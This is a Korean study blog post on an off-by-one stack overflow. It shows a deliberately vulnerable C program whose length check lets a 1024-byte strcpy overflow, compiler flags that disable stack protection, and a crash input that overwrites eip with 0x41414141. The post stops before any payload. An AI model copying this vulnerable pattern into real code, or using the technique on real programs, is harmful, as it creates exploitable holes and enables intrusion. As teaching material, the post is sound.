---
layout: post
title: "Off-By-One"
date: 2018-10-31
excerpt: "BOF없이 eip 조작"
tags: [study]
comments: true
---

```c
#include <stdio.h>

int overflow(char *str)
{
    char buf[1024];
    strcpy(buf, str);
    printf("%s\r\n",buf);
}
 
int main(int argc,char *argv[])
{
    if (strlen(argv[1]) > 1024) 
    {
        printf("No Buffer Overflow!!!\n");
        return 1;
    }

    overflow(argv[1]);

    return 0;
}
```
우선 위와 같은 코드를 컴파일합니다.
```
gcc -o offbyone offbyone.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
```

argv[1]의 길이가 1024를 넘는지 확인하고, 넘는다면 BOF 방지 메시지를 띄우며 리턴합니다.

그렇지 않다면 overflow()에서 strcpy로 argv[1]을 buf로 복사하는데, 직관적으로는 BOF가 발생하지 않으며 안전한 코드로 느껴집니다.

```bash
~/pwn/stack/obo st4nw@trust
❯ ./offbyone `python -c 'print "A" * 1060'`
No Buffer Overflow!!!
```
실제로도 argv[1]의 길이가 1024를 넘어가면 프로그램이 정상적으로 종료됩니다. 그다음은 정확히 1024를 넣어보겠습니다.

```bash
~/pwn/stack/obo st4nw@trust
❯ ./offbyone `python -c 'print "A" * 1024'`

[1]    29692 segmentation fault (core dumped)  ./offbyone `python -c 'print "A" * 1024'`

~/pwn/stack/obo st4nw@trust
❯ gdb -c core -q                           
pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
[New LWP 29692]
Core was generated by `./offbyone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
```
Segmentation Fault가 발생하며, eip가 0x41414141(AAAA)로 조작된 것을 볼 수 있습니다. gdb로 프로그램의 작동 과정을 살펴보겠습니다.
